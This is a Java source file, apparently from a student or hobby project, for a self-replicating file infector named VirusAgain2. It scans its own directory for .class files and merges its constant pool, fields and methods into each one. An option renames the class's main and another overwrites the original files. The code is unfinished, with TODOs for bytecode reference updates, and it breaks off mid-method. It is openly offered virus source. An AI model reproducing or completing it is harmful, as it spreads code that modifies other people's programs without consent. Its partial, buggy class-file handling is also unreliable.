package tmp;
import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.URL;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;

/**
 * Class whose _____search() function infects clean classes with a copy of itself.
 *
 * TODO: Append code to the clean main() that calls our function _____search().
 * TODO: Update constant_pool references in the bytecode.
 * TODO: Code cleanup. There's a lot of messy code here.
 * 
 * "_____" is added to the name of functions to avoid naming conflicts with functions from the clean class.
 */
class VirusAgain2 {
	/**
	 * Don't actually infect the file (don't write out any infected code).
	 * Useful for testing that our file parsing is correct and nothing is corrupted.
	 */
	private static boolean DONT_INFECT = false;

	/**
	 * Turn on/off some debugging output.
	 */
	private final static boolean DEBUG_MESSAGES = true;

	/**
	 * Always succeed on the infection test for the specified infected file.
	 */
	private final static boolean INFECTED_INFECTION_CHECK_IS_SHORTWIRED = true;
	private final static boolean CLEAN_INFECTION_CHECK_IS_SHORTWIRED = false;

	/**
	 * Rename the class's main().
	 */
	private final static boolean RENAME_UNINFECTED_MAIN = false;
	private final static boolean RENAME_INFECTED_MAIN = true;

	/**
	 * Remove the infected class's main() entry in the methods[] table.
	 */
	private final static boolean REMOVE_INFECTED_MAIN = false;
	private final static boolean REMOVE_INFECTED_INIT = false;

	/**
	 * Overwrite clean files with their infected counterpart.
	 */
	private final static boolean OVERWRITE_INFECTED_FILES = false;

	/**
	 * The infected file probably only has one attribute, the source file.
	 * You almost certainly do NOT want to do this.
	 */
	private final static boolean WRITE_INFECTED_ATTRIBUTES_OUT = false;

	/**
	 * And unused private constructor
	 *  so the infected class doesn't end up with two zero-arg constructors.
	 */
	private VirusAgain2(VirusAgain2 v) {
	}

	/**
	 * The name of the injected class.
	 * We use this because it this as a UTF8 is the second constant_pool entry in the original virus class
	 *  (and therefore the second [infection] constant_pool entry in any infected files also).
	 */
	private final static String INFECTION_IDENTIFIER = "VirusAgain";

	/**
	 * What we want to rename the function.
	 * This should be the same length or shorter than the original name.
	 */
	private final static byte[] MAIN_RENAMED_NAME = { '_', '_', '_', 'M' };

	private final static int CONSTANT_Class = 7;
	private final static int CONSTANT_Fieldref = 9;
	private final static int CONSTANT_Methodref = 10;
	private final static int CONSTANT_InterfaceMethodref = 11;
	private final static int CONSTANT_String = 8;
	private final static int CONSTANT_Integer = 3;
	private final static int CONSTANT_Float = 4;
	private final static int CONSTANT_Long = 5;
	private final static int CONSTANT_Double = 6;
	private final static int CONSTANT_NameAndType = 12;
	private final static int CONSTANT_Utf8 = 1;
	private final static int CONSTANT_MethodHandle = 15;
	private final static int CONSTANT_MethodType = 16;
	private final static int CONSTANT_InvokeDynamic = 18;

	/**
	 * args[0] = Folder that the files are in.
	 * args[1] = Infected file name. (You can use this class's name for that, VirusAgain.class)
	 * args[2] = Uninfected file name. (i.e. HelloWorld.class)
	 * args[3] = Output file name. (i.e. output/HelloWorld.class)
	 * 
	 * @param args
	 * @throws Throwable
	 */
	public static void main(String args[]) throws Throwable {
		if (DEBUG_MESSAGES) {
			System.out.println("-----START-----");
		}

		_____search();

		if (DEBUG_MESSAGES) {
			System.out.println("-----END-----");
		}
	}

	/**
	 * Search the current directory for:
	 *  a) An infected class. i.e. itself.
	 *  b) A list of uninfected classes.
	 * @throws IOException 
	 */
	private static void _____search() throws Throwable {
		/*
		 * Get _this_ class's path and name so we can open it.
		 */
		Path this_classes_path;
		{
			String name = Thread.currentThread().getStackTrace()[1].getClassName();
			Class<?> thisClass = Class.forName(name);
			URL url = thisClass.getResource(thisClass.getSimpleName() + ".class");
			this_classes_path = Paths.get(url.toURI());
		}

		if (DEBUG_MESSAGES) {
			System.out.println("This .class file is located at:\n\t" + this_classes_path.toString());
			System.out.println("This .class file is located at:\n\t" + this_classes_path.getParent().toString());
		}
		/*
		 * Look for uninfected files in the current working directory
		 *  then infect them.
		 */
		Path dir;
		//dir = Paths.get("./", "");//The directory to search in (should be working directory, but for now it's bin/
		dir = this_classes_path.getParent();

		DirectoryStream<Path> stream;
		try {
			stream = Files.newDirectoryStream(dir, "*.class");
		} catch (IOException ex) {
			System.err.println(ex);
			return;
		}

		for (Path entry : stream) {
			_____infect(this_classes_path, entry);
		}
	}

	@SuppressWarnings("unused")
	private static void _____infect(Path infected_path, Path clean_path) {
		try {
			System.out.println(clean_path.getFileName());//TODO: deleteme
			/*
			 * Indices to keep track of where we are in the clean class file and the infected class file.
			 */
			int clean_index;
			int infected_index;

			/*
			 * Read the clean class file in as a byte array
			 *  and check that the clean file is indeed a clean .class file.
			 */
			byte clean_bytes[] = Files.readAllBytes(clean_path);
			int clean_indices[];
			{
				/*
				 * Get indices of the clean file. 
				 */
				int clean_retval[][] = _____isFileInfected(clean_bytes, null);
				clean_indices = clean_retval[0];

				if (clean_indices == null || clean_indices[0] >= 0) {
					//throw new Error("The specified clean file " + clean_path.getFileName() + " wasn't actually clean.");
					if (DEBUG_MESSAGES) {
						System.out.println("The specified file " + clean_path.getFileName() + " wasn't actually clean.");
					}
					return;
				}

				/*
				 * Check clean file for static main(String args[]). If none then throw error.
				 * If static main(String args[]) exists then then rename to MAIN_RENAMED_NAME.
				 */
				{
					/*
					 * Check if the clean file has a main(String args[]) function.
					 */
					if (CLEAN_INFECTION_CHECK_IS_SHORTWIRED) {
						if (DEBUG_MESSAGES) {
							System.out.println("Clean infectedness test was shortwired.");
						}
					}
					else if (clean_indices[4] == -1) {
						throw new Error("The specified clean file had no main(String args[]) function.");
					}
				}
			}
			/*
			 * Read the infected class file in as a byte array
			 *  and check that the infected file is indeed an infected .class file.
			 */
			byte infected_bytes[];
			int infected_indices[];
			int infected_cp_byte_indices[];
			HashMap<Integer, String> infected_UTF8_lookup;
			{
				infected_bytes = Files.readAllBytes(infected_path);

				/*
				 * Check if the specified infected file is actually infected.
				 */
				infected_UTF8_lookup = new HashMap<Integer, String>();
				int infected_retval[][] = _____isFileInfected(infected_bytes, infected_UTF8_lookup);

				infected_indices = infected_retval[0];

				/*
				 * Get constant_pool indices of infected file.
				 */
				infected_cp_byte_indices = infected_retval[1];

				if (INFECTED_INFECTION_CHECK_IS_SHORTWIRED) {
					//Ignore failure of the infectedness test. Just use start of constant_pool as offset.
					infected_indices[0] = infected_indices[1];
					infected_indices[3] = 10;
					if (DEBUG_MESSAGES) {
						System.out.println("Infected infectedness test was shortwired.");
					}
				}
				else if (infected_indices == null || infected_indices[0] < 0) {
					throw new Error("The specified infected file wasn't actually infected.");
				}
			}

			/*
			 * Open output stream so we can write our infected copy of the clean class out.
			 * TODO: Make this based on the clean file. (or the clean file itself)
			 */
			RandomAccessFile out;
			{
				File output_file;
				if (OVERWRITE_INFECTED_FILES) {
					/*
					 * We want to overwrite the infected files.
					 */
					output_file = clean_path.toFile();
				}
				else {
					/*
					 * We want to create a separate output folder out/ that contains the infected classes.
					 */
					File output_folder = new File(clean_path.getParent() + "/out/");
					output_folder.mkdirs();//Create the output folder
					output_file = new File(clean_path.getParent() + "/out/" + clean_path.getFileName());
				}
				//out = new FileOutputStream(output_file);
				out = new RandomAccessFile(output_file, "rw");
			}

			/*
			 * The number of constant_pool entries originally in the clean class file.
			 */
			final int cp_index_change_amount;

			/*
			 * --------------------------------------------------
			 * constant_pool[]
			 * --------------------------------------------------
			 */
			HashSet<Integer> remove_name_indices = new HashSet<Integer>();
			{

				/*
				 * Modify the constant_pool_count of the clean file by adding INFECTED_constant_pool_count.
				 */
				{
					int new_constant_pool_count = 1 + clean_indices[1];
					if (DONT_INFECT == false) {
						new_constant_pool_count += infected_indices[0];
						{
							byte tmp_bytes[] = _____intTo2Bytes(new_constant_pool_count);
							clean_bytes[8] = tmp_bytes[0];
							clean_bytes[9] = tmp_bytes[1];
						}
					}
					System.out.println("\tconstant_pool_count = " + (new_constant_pool_count - 1) + " + 1 (clean)" + clean_indices[1] + " + (infected)" + infected_indices[0]);
				}

				/*
				 * Remove the specified functions from the infected file.
				 * NOTE: Been modified to only remove the NameAndType part, as the other bits seem to be used.
				 */
				ArrayList<String> remove_names = new ArrayList<String>();
				if (REMOVE_INFECTED_INIT) {
					remove_names.add("<init>");
				}
				if (REMOVE_INFECTED_MAIN) {
					remove_names.add("main");
				}
				for (String name : remove_names) {
					int functions_constant_pool_indices[] = _____locateFunctionFromConstantPool(infected_bytes, infected_cp_byte_indices, name);
					if (functions_constant_pool_indices != null) {
						/*
						 * 1 instead of functions_constant_pool_indices.length
						 *  because we only want to noop the CONSTANT_Methodref.
						 */
						for (int i = 0; i < 1 /*functions_constant_pool_indices.length*/; ++i) {
							if (DEBUG_MESSAGES) {
								System.out.println("noop'd " + (functions_constant_pool_indices[i] + 1));
							}
							/*
							 * Noop the constant_pool entry.
							 */
							_____noopConstantPoolEntry(infected_bytes,
									infected_cp_byte_indices[functions_constant_pool_indices[i]]);

							/*
							 * Take note that the constant_pool entry has been noop'd.
							 * We use this information later to remove methods[] entries.
							 */
							remove_name_indices.add(functions_constant_pool_indices[i]);
						}
					}
				}

				/*
				 * Rename the clean file's main function.
				 */
				if (RENAME_UNINFECTED_MAIN) {
					for (int i = 0; i < MAIN_RENAMED_NAME.length; ++i) {
						clean_bytes[clean_indices[4] + i] = MAIN_RENAMED_NAME[i];
					}
				}

				/*
				 * Rename the infected file's main function.
				 */
				if (RENAME_INFECTED_MAIN) {
					for (int i = 0; i < MAIN_RENAMED_NAME.length; ++i) {
						infected_bytes[infected_indices[4] + i] = MAIN_RENAMED_NAME[i];
					}
				}

				/*
				 * Write out the start of the clean file, including the constant_pool_count.
				 */
				clean_index = 10;
				out.write(clean_bytes, 0, clean_index);

				/*
				 * Write out the constant_pool.
				 */
				out.write(clean_bytes, clean_index, clean_indices[2] - clean_index);
				clean_index = clean_indices[2];

				/*
				 * Write out the infected constant_pool.
				 */
				infected_index = 10;
				cp_index_change_amount = clean_indices[1] + (infected_indices[1] - infected_indices[0]);
				if (DONT_INFECT == false) {
					/*
					 * Update constant_pool references in the infected constant pool.
					 */
					for (int i = 0; i < infected_cp_byte_indices.length - 1; ++i) {
						_____increaseConstantPoolEntryRefs(infected_cp_byte_indices[i], infected_bytes, cp_index_change_amount);
						out.write(infected_bytes, infected_cp_byte_indices[i], infected_cp_byte_indices[i + 1] - infected_cp_byte_indices[i]);

						//int next_infected_index = _____increaseConstantPoolEntryRefs(infected_index, infected_bytes, cp_index_change_amount);
						//out.write(infected_bytes, infected_index, next_infected_index - infected_index);
						//infected_index = next_infected_index;
					}
					//
					//					/*
					//					 * Write out the newly updated, infected constant_pool.
					//					 */
					//					out.write(infected_bytes, infected_indices[3], infected_indices[2] - infected_indices[3]);
					//out.write(infected_bytes, 10, infected_indices[2] - 10);
				}
				infected_index = infected_indices[2];
			}

			/*
			 * --------------------------------------------------
			 * interfaces[]
			 * --------------------------------------------------
			 */
			{
				//u2	access_flags;
				//u2	this_class;
				//u2	super_class;int infected_cp_byte_indices[];
				/*
				 * Write out those 6 clean bytes. 
				 */
				{
					int length = 2 * 3;
					out.write(clean_bytes, clean_index, length);
					clean_index += length;
					infected_index += length;
				}

				/*
				 * Get the new interfaces_count.
				 */
				int clean_interfaces_count = _____bytes2(clean_bytes, clean_index);
				clean_index += 2;
				int infected_interfaces_count = _____bytes2(infected_bytes, infected_index);
				infected_index += 2;

				/*
				 * Write out new interfaces count.
				 */
				{
					int interfaces_count = clean_interfaces_count;
					if (DONT_INFECT == false) {
						interfaces_count += infected_interfaces_count;
					}
					if (DEBUG_MESSAGES) {
						System.out.println("\tInterfaces: " + interfaces_count + " = (clean)" + clean_interfaces_count + " + (infected)" + infected_interfaces_count);
					}
					{
						byte tmp_bytes[] = _____intTo2Bytes(interfaces_count);
						out.write(tmp_bytes, 0, 2);
					}
				}

				/*
				 * Write out clean interfaces table.
				 */
				{
					//u2	interfaces_count;
					int clean_interfaces_length = 2 * clean_interfaces_count;

					//u2	interfaces[interfaces_count];
					out.write(clean_bytes, clean_index, clean_interfaces_length);
					clean_index += clean_interfaces_length;
				}
				/*
				 * Write out infected interfaces table.
				 */
				if (DONT_INFECT == false) {
					//u2	interfaces_count;
					int infected_interfaces_length = 2 * infected_interfaces_count;

					//u2	interfaces[interfaces_count];
					out.write(infected_bytes, infected_index, infected_interfaces_length);
					infected_index += infected_interfaces_length;
				}
			}

			/*
			 * --------------------------------------------------
			 * fields[]
			 * --------------------------------------------------
			 */
			{
				/*
				 * Get the new fields[] count.
				 */
				{
					int clean_fields_count = _____bytes2(clean_bytes, clean_index);
					int infected_fields_count = _____bytes2(infected_bytes, infected_index);

					int fields_count = clean_fields_count;
					if (DONT_INFECT == false) {
						fields_count += infected_fields_count;
					}
					if (DEBUG_MESSAGES) {
						System.out.println("\tFields: " + fields_count + " = (clean)" + clean_fields_count + " + (infected)" + infected_fields_count);
					}

					/*
					 * Write out fields[] count.
					 */
					{
						byte tmp_bytes[] = _____intTo2Bytes(fields_count);
						out.write(tmp_bytes, 0, 2);
					}
				}

				/*
				 * Write out the clean fields[] table.
				 */
				int clean_retval[] = _____parseAndUpdateMethodsPool(out, clean_bytes, clean_index, 0, null, null);
				clean_index = clean_retval[1];

				/*
				 * Write out the infected fields[] table.
				 */
				RandomAccessFile tmp_out = out;
				if (DONT_INFECT) {
					tmp_out = null;
				}
				int infected_retval[] = _____parseAndUpdateMethodsPool(tmp_out, infected_bytes, infected_index, cp_index_change_amount, infected_UTF8_lookup, null);
				infected_index = infected_retval[1];
			}

			/*
			 * --------------------------------------------------
			 * methods[]
			 * --------------------------------------------------
			 */
			{
				/*
				 * Write out methods_count that we'll overwrite later.
				 */
				final long methods_count_fp = out.getFilePointer();
				out.writeByte(0);
				out.writeByte(0);

				/*
				 * Parse clean methods[] table.
				 */
				int clean_retval[] = _____parseAndUpdateMethodsPool(out, clean_bytes, clean_index, 0, null, null);
				clean_index = clean_retval[1];

				final int num_clean_methods = clean_retval[0];
				int new_methods_count = num_clean_methods;

				/*
				 * Parse and update refs in infected methods[] table.
				 */
				RandomAccessFile tmp_out = out;
				if (DONT_INFECT) {
					tmp_out = null;
				}
				int infected_retval[] = _____parseAndUpdateMethodsPool(tmp_out, infected_bytes, infected_index, cp_index_change_amount, infected_UTF8_lookup, remove_name_indices);
				infected_index = infected_retval[1];
				final int num_infected_methods = infected_retval[0];
				if (DONT_INFECT == false) {
					new_methods_count += num_infected_methods;
				}

				if (DEBUG_MESSAGES) {
					System.out.println("\tMethods: " + new_methods_count + " = (clean)" + num_clean_methods + " + (infected)" + num_infected_methods);
				}

				/*
				 * Write out the new methods_count
				 */
				{
					final long fp = out.getFilePointer();
					//System.out.println(methods_count_fp + " : " + fp);
					out.seek(methods_count_fp);
					{
						byte tmp_bytes[] = _____intTo2Bytes(new_methods_count);
						out.write(tmp_bytes);
					}
					out.seek(fp);
				}
			}

			/*
			 * --------------------------------------------------
			 * attributes[]
			 * --------------------------------------------------
			 */
			{
				/*
				 * Write out the clean attributes[] table.
				 */
				{
					/*
					 * Write out clean attributes_count.
					 */
					int clean_attributes_count = _____bytes2(clean_bytes, clean_index);
					int attributes_count = clean_attributes_count;
					if (WRITE_INFECTED_ATTRIBUTES_OUT) {
						int infected_attributes_count = _____bytes2(infected_bytes, infected_index);

						if (DONT_INFECT == false) {
							attributes_count += infected_attributes_count;
						}

						System.out.println("\tAttributes: " + attributes_count +
								" = (clean)" + clean_attributes_count +
								" + (infected)" + infected_attributes_count);
					}
					out.write(clean_bytes, clean_index, 2);

					clean_index += 2;
					infected_index += 2;
				}

				/*
				 * Write clean attributes out.
				 */
				out.write(clean_bytes, clean_index, (clean_bytes.length - clean_index));

				/*
				 * Write infected attributes out.
				 */
				if (DONT_INFECT == false && WRITE_INFECTED_ATTRIBUTES_OUT) {
					out.write(infected_bytes, infected_index, (infected_bytes.length - infected_index));
				}
			}

			/*
			 * Set the length of the file to whatever our current index is.
			 * This is required because the RandomAccessFile class seems to add tons of padding
			 *  to the end of the file otherwise.
			 */
			out.setLength(out.getFilePointer());

			out.close();
		} catch (Throwable ex) {
			ex.printStackTrace();
		}
	}

	/**
	 * Overwrite a constant_pool entry with a noop.
	 * @param bytes
	 * @param index Byte index of the constant_pool entry in bytes.
	 */
	private static void _____noopConstantPoolEntry(byte bytes[], int index) {
		int length = _____getConstantPoolEntryLength(bytes, index);

		bytes[index] = CONSTANT_Utf8;

		byte tmp_bytes[] = _____intTo2Bytes(length - 3);
		bytes[index + 1] = tmp_bytes[0];
		bytes[index + 2] = tmp_bytes[1];

		for (int i = 3; i < length; ++i) {
			bytes[index + i] = 'A';
		}
	}

	/**
	 * Given a function name find its Methodref structure in the constant_pool,
	 *  then return the (constant_pool) index of that Methodref
	 *  and the non-UTF8 constant_pool entries that it references.
	 * 
	 * @param bytes
	 * @param constant_pool_indices
	 * @param function_name	The function we want to locate.
	 * @return null if no function with that name was not found.
	 * 	Otherwise an array of three indices, the CONSTANT_Methodref, the CONSTANT_NameAndType,
	 *   and the CONSTANT_Utf8.
	 */
	private static int[] _____locateFunctionFromConstantPool(byte bytes[], final int constant_pool_indices[], String function_name) {
		for (int i = 0; i < constant_pool_indices.length; ++i) {
			if (bytes[constant_pool_indices[i]] == CONSTANT_Methodref) {
				//CONSTANT_Methodref_info -> CONSTANT_NameAndType_info
				int nextIndex1 = _____bytes2(bytes, constant_pool_indices[i] + (1 + 2));
				--nextIndex1;//Because arrays are 0 indexed but constant_pool isn't

				if (bytes[constant_pool_indices[nextIndex1]] != CONSTANT_NameAndType) {
					/*
					 * No need to throw an error here, just means the method has been noop'd.
					 */
					continue;
				}

				//CONSTANT_NameAndType_info -> CONSTANT_Utf8_info
				int nextIndex2 = _____bytes2(bytes, constant_pool_indices[nextIndex1] + 1);
				--nextIndex2;//Because arrays are 0 indexed but constant_pool isn't

				if (bytes[constant_pool_indices[nextIndex2]] != CONSTANT_Utf8) {
					throw new Error("#" + (i + 1) + ", #" + (nextIndex1 + 1) + ", #" + (nextIndex2 + 1) + ", 2 != CONSTANT_Utf8, = "
							+ bytes[constant_pool_indices[nextIndex2]]);
				}

				int str_len = _____bytes2(bytes, (constant_pool_indices[nextIndex2] + 1));
				String name = _____parseCONSTANT_Utf8(bytes, constant_pool_indices[nextIndex2] + 3, str_len);
				//System.out.println(name);
				if (name.equals(function_name)) {
					return new int[] { i, nextIndex1, nextIndex2 };
				}
			}
		}
		return null;
	}

	/**
	 * Returns the total length of a given constant_pool entry in bytes.
	 * @param bytes
	 * @param index
	 * @return
	 */
	private static int _____getConstantPoolEntryLength(byte bytes[], int index) {
		//u1	tag
		final int constant_entry_tag = bytes[index];
		int length = 1;

		switch (constant_entry_tag) {
		case CONSTANT_Class:
		case CONSTANT_String:
		case CONSTANT_MethodType:
			length += 2;
			break;
		case CONSTANT_Fieldref:
		case CONSTANT_Methodref:
		case CONSTANT_InterfaceMethodref:
		case CONSTANT_Integer:
		case CONSTANT_Float:
		case CONSTANT_NameAndType:
		case CONSTANT_InvokeDynamic:
			length += 4;
			break;
		case CONSTANT_Long:
		case CONSTANT_Double:
			length += 8;
			break;
		case CONSTANT_MethodHandle:
			length += 3;
			break;
		case CONSTANT_Utf8:
			length += 2 + _____bytes2(bytes, index + 1);
			break;
		}
		return length;
	}

	/**
	 * Increase the constant_pool indices that the method_info structures reference.
	 *  i.e. Add increment_amount to the name_index.
	 * Can be used as a kludgy method of skipping over the the methods[] table by setting
	 *  change_amount = 0 and UTF8_lookup = null. 
	 * @param bytes
	 * @param index
	 * @param change_amount
	 * @param UTF8_lookup
	 * @return [The number of methods, the index of the first byte after the methods[] table]
	 * @throws IOException 
	 */
	private static int[] _____parseAndUpdateMethodsPool(final RandomAccessFile out, byte bytes[], int index,
			final int change_amount, HashMap<Integer, String> UTF8_lookup, HashSet<Integer> remove_name_indices) throws IOException {
		int methods_count = _____bytes2(bytes, index);
		index += 2;

		int new_methods_count = methods_count;
		for (int i = 0; i < methods_count; ++i) {
			final int start_index = index;

			//access_flags
			index += 2;

			//name_index
			int name_index = _____bytes2(bytes, index);
			--name_index;
			/*
			 * Check if this is a method we want to remove.
			 */
			boolean skipThisMethod = false;
			if (remove_name_indices != null && remove_name_indices.contains(name_index)) {
				/*
				 * Remove this method (by skipping it).
				 */
				--new_methods_count;
				skipThisMethod = true;
			}

			/*int new_name_index =*/_____increase2Index(bytes, index, change_amount);
			index += 2;

			//descriptor_index
			/*int new_descriptor_index =*/_____increase2Index(bytes, index, change_amount);
			index += 2;

			/*
			 * Write out access_flags, name_index, descriptor_index.
			 */
			if (skipThisMethod == false && out != null) {
				out.write(bytes, start_index, 6);
			}

			//attributes_count
			final long attributes_count_fp = out.getFilePointer();
			int attributes_count = _____bytes2(bytes, index);
			index += 2;

			/*
			 * Write out attributes_count.
			 */
			if (skipThisMethod == false && out != null) {
				out.write(bytes, start_index + 6, 2);
			}
			//System.out.println("attributes_count = " + attributes_count);

			/*
			 * Modify the attributes[] of this method_info.
			 */
			RandomAccessFile tmp_out = out;
			if (skipThisMethod) {
				tmp_out = null;
			}
			for (int j = 0; j < attributes_count; ++j) {
				index = _____updateAttribute(tmp_out, bytes, start_index, attributes_count_fp,
						index, change_amount, UTF8_lookup);
			}
		}

		int retval[] = new int[2];
		retval[0] = new_methods_count;
		retval[1] = index;
		return retval;
	}

	/**
	 * 
	 * @param bytes
	 * @param index
	 * @param change_amount
	 * @param UTF8_lookup
	 * @return The index of the first byte after the attribute.
	 * @throws IOException 
	 */
	private static int _____updateAttribute(RandomAccessFile out, byte bytes[], final int method_start,
			final long attributes_count_fp, int index, final int change_amount, HashMap<Integer, String> UTF8_lookup) throws IOException {
		final int old_index = index;
		final long start_fp = out.getFilePointer();

		/*
		 * Get u2 attribute_name_index,
		 *  then add change_amount to it and write out the value. 
		 */
		int attributes_name_index = _____bytes2(bytes, index);
		_____increase2Index(bytes, index, change_amount);
		if (out != null) {
			out.write(bytes, index, 2);
		}
		index += 2;
		
		/*
		 * Get the attribute name.
		 */
		String attribute_name;
		if (UTF8_lookup == null) {
			attribute_name = null;
		}
		else {
			attribute_name = UTF8_lookup.get(attributes_name_index);
		}

		/*
		 * Get and then write out attribute_length.
		 */
		final int attribute_length = _____bytes4(bytes, index);
		if (out != null) {
			out.write(bytes, index, 4);
		}
		index += 4;
		System.out.println("attribute_length = " + attribute_length);
		System.out.println("\tchange_amount = " + change_amount);
		System.out.println("\tattributes_name_index = " + attributes_name_index);
		System.out.println("\tattribute_name = " + attribute_name);

		/*
		 * Skip processing if we don't need to do it.
		 */
		if (change_amount != 0) {

			/*
			 * Deal with attributes_info and update any constant_pool references it may contain.
			 */
			if (attribute_name != null) {
				if (attribute_name.equals("Code")) {
					//System.out.println("attribute_info Code updated");

					//u2	max_stack
					//u2	max_locals
					if (out != null) {
						out.write(bytes, index, 4);
					}
					index += 4;

					//u4	code_length
					final int code_length = _____bytes4(bytes, index);
					if (out != null) {
						out.write(bytes, index, 4);
					}
					index += 4;

					/*
					 * --------------------------------------------------
					 * [[Zhen & Min]]
					 * TODO: Update code here.
					 *  In other words, look through bytes[index] to bytes[index + code_length]
					 *  and increase any constant_pool references inside the code by change_amount.
					 *  This can be done using the function increase2Index(bytes, index, change_amount);.
					 */

					/*
					 * noop out all the code so we can see if it works
					 *  when we take constant_pool refs out of the picture.
					 */
					//					{
					//						final int code_end = index + code_length;
					//						for (int i = index; i < code_end; ++i) {
					//							bytes[i] = (byte) 0;
					//						}
					//						/*
					//						 * Add return.
					//						 */
					//						//bytes[index] = (byte) 0xb1;
					//						bytes[code_end - 1] = (byte) 0xb1;
					//					}

					/*
					 * --------------------------------------------------
					 */

					/*
					 * Output the code.
					 */
					out.write(bytes, index, code_length);
					index += code_length;

					/*
					 * Parse and output the exception table.
					 * u2 exception_table_length;
					 */
					int exception_table_length = _____bytes2(bytes, index);
					if (out != null) {
						out.write(bytes, index, 2);
					}
					index += 2;

					{
						final int exceptions_index = index;
						for (int i = 0; i < exception_table_length; ++i) {
							index += 6;

							//catch_type
							int catch_type = _____bytes2(bytes, index);
							if (catch_type != 0) {
								_____increase2Index(bytes, index, change_amount);
							}
							index += 2;
						}
						if (out != null) {
							out.write(bytes, exceptions_index, index - exceptions_index);
						}
					}

					/*
					 * Get and write out attributes_count.
					 */
					int attributes_count = _____bytes2(bytes, index);

					final long passed_attributes_count_fp = out.getFilePointer();
					if (out != null) {
						out.write(bytes, index, 2);
					}
					index += 2;

					/*
					 * Parse (and write out) the attributes recursively.
					 */
					for (int i = 0; i < attributes_count; ++i) {
						index = _____updateAttribute(out, bytes, method_start,
								passed_attributes_count_fp, index, change_amount, UTF8_lookup);
					}

					/*
					 * Calculate the _actual_ length of this attribute
					 *  then overwrite the original value.
					 */
					{
						final long actual_attribute_length = out.getFilePointer() - start_fp - 6;
						{
							final long fp = out.getFilePointer();
							out.seek(start_fp + 2);
							out.write(_____intTo4Bytes((int) actual_attribute_length));
							out.seek(fp);
						}
					}
					//Set out to null so nothing else will be written out.
					out = null;
				}
				else if (attribute_name.equals("ConstantValue")
						|| attribute_name.equals("SourceFile")) {
					//System.out.println("attribute_info ConstantValue or SourceFile updated");
					/*
					 * Increase constant_pool reference in a ConstantValue or SourceFile type attribute.
					 * 	i.e. constantvalue_index = constantvalue_index + constantvalue_index
					 */
					_____increase2Index(bytes, index, change_amount);
				}
				else if (attribute_name.equals("StackMapTable")) {
					/*
					 * Decrement the attributes count then seek to the start of the attribute
					 *  (in effect, skip this attribute).
					 */
					if (out != null) {
						out.seek(attributes_count_fp);
						/*
						 * Decrement attributes_count.
						 */
						{
							byte tmp_in[] = new byte[2];
							tmp_in[0] = out.readByte();
							tmp_in[1] = out.readByte();

							int attributes_count = _____bytes2(tmp_in, 0);
							--attributes_count;

							byte tmp_out[] = _____intTo2Bytes(attributes_count);

							out.seek(attributes_count_fp);
							out.write(tmp_out);
						}
						out.seek(start_fp);
					}
					//Set out to null so nothing else will be written out.
					out = null;

					//					/*
					//					 * TODO: NOTE: We'er having problems here.
					//					 * Issues with the following error:
					//					 * 		StackMapTable format error: bad class index
					//					 * 
					//					 * We can't just set number_of_entries = 0, since sadly Java does pick up on this
					//					 *  and then give the following error:
					//					 *  	StackMapTable format error: wrong attribute size
					//					 *  
					//					 * One possible way around this is the somehow no-op this entry (should work without StackMapTable).
					//					 */
					//
					//					int number_of_entries = _____bytes2(bytes, index);
					//
					//					index += 2;
					//
					//					for (; 0 < number_of_entries; --number_of_entries) {
					//						/*
					//						 * stack_map_frame
					//						 */
					//						{
					//							int smf_tag = bytes[index];
					//							index += 1;
					//
					//							/*
					//							 * union verification_type_info
					//							 */
					//							if (smf_tag <= 63) {
					//								_____update_verification_type_info(bytes, index - 1, change_amount);
					//							}
					//
					//							/*
					//							 * same_locals_1_stack_item_frame
					//							 */
					//							if (64 <= smf_tag && smf_tag <= 127) {
					//								index = _____update_verification_type_info(bytes, index, change_amount);
					//							}
					//							/*
					//							 * same_locals_1_stack_item_frame_extended
					//							 */
					//							else if (smf_tag == 247) {
					//								index += 2;
					//								index = _____update_verification_type_info(bytes, index, change_amount);
					//							}
					//							/*
					//							 * chop_frame || same_frame_extended
					//							 */
					//							else if (248 <= smf_tag && smf_tag <= 251) {
					//								index += 2;
					//							}
					//							/*
					//							 * append_frame
					//							 */
					//							else if (252 <= smf_tag && smf_tag <= 254) {
					//								index += 2;
					//
					//								smf_tag -= 251;
					//								for (; 0 < smf_tag; --smf_tag) {
					//									index = _____update_verification_type_info(bytes, index, change_amount);
					//								}
					//							}
					//							/*
					//							 * full_frame
					//							 */
					//							else if (smf_tag == 255) {
					//								index += 2;
					//
					//								int number_of_locals = _____bytes2(bytes, index);
					//								index += 2;
					//
					//								for (; 0 < number_of_locals; --number_of_locals) {
					//									index = _____update_verification_type_info(bytes, index, change_amount);
					//								}
					//
					//								int number_of_stack_items = _____bytes2(bytes, index);
					//								index += 2;
					//
					//								for (; 0 < number_of_stack_items; --number_of_stack_items) {
					//									index = _____update_verification_type_info(bytes, index, change_amount);
					//								}
					//							}
					//						}
					//					}
				}
				else if (attribute_name.equals("Exceptions")) {
					//System.out.println("attribute_info Exceptions updated");
					int number_of_exceptions = _____bytes2(bytes, index);
					index += 2;

					for (int i = 0; i < number_of_exceptions; ++i) {
						_____increase2Index(bytes, index, change_amount);
						index += 2;
					}
				}
				else if (attribute_name.equals("BootstrapMethods")) {
					//System.out.println("attribute_info BootstrapMethods updated");
					int num_bootstrap_methods = _____bytes2(bytes, index);
					index += 2;

					for (int i = 0; i < num_bootstrap_methods; ++i) {
						_____increase2Index(bytes, index, change_amount);
						index += 2;

						int num_bootstrap_arguments = _____bytes2(bytes, index);
						index += 2;

						for (int j = 0; j < num_bootstrap_arguments; ++j) {
							_____increase2Index(bytes, index, change_amount);
							index += 2;
						}
					}
				}
				else if (attribute_name.equals("LocalVariableTable")) {
					//System.out.println("attribute_info LocalVariableTable updated");
					int local_variable_table_length = _____bytes2(bytes, index);
					index += 2;

					for (int i = 0; i < local_variable_table_length; ++i) {
						index += 4;

						_____increase2Index(bytes, index, change_amount);
						index += 2;

						_____increase2Index(bytes, index, change_amount);
						index += 4;
					}
				}
				else if (attribute_name.equals("LocalVariableTable")
						|| attribute_name.equals("LocalVariableTypeTable")) {
					//System.out.println("attribute_info LocalVariableTable updated");
					int local_variable_table_length = _____bytes2(bytes, index);
					index += 2;

					for (int i = 0; i < local_variable_table_length; ++i) {
						index += 4;

						_____increase2Index(bytes, index, change_amount);
						index += 2;

						_____increase2Index(bytes, index, change_amount);
						index += 4;
					}
				}
				else if (attribute_name.equals("InnerClasses")) {
					//System.out.println("attribute_info InnerClasses updated");
					int number_of_classes = _____bytes2(bytes, index);
					index += 2;

